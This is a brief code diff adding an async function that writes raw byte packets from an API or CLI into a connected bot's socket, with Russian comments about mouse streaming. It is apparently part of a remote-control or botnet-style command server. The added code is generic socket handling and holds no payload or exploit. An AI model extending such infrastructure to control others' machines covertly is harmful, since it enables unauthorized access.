@@ -82,3 +82,20 @@ async def send_command(cid: str, command: str) -> bool:
     else:
         logger.warning(f"[!] Client {cid} not found")
         return False
+
+
+async def send_binary_to_bot(bot_id: str, packet: bytes) -> bool:
+    """
+    Универсальный проброс байтов от API/CLI напрямую в сокет бота.
+    """
+    if bot_id in client:
+        try:
+            _, writer = client[bot_id]
+            writer.write(packet)
+            # Для потоковых данных (мышь) drain() может создавать задержку.
+            # Но для надежности команд он необходим.
+            await writer.drain()
+            return True
+        except Exception as e:
+            logger.error(f"[Services] Ошибка отправки боту {bot_id}: {e}")
+    return False
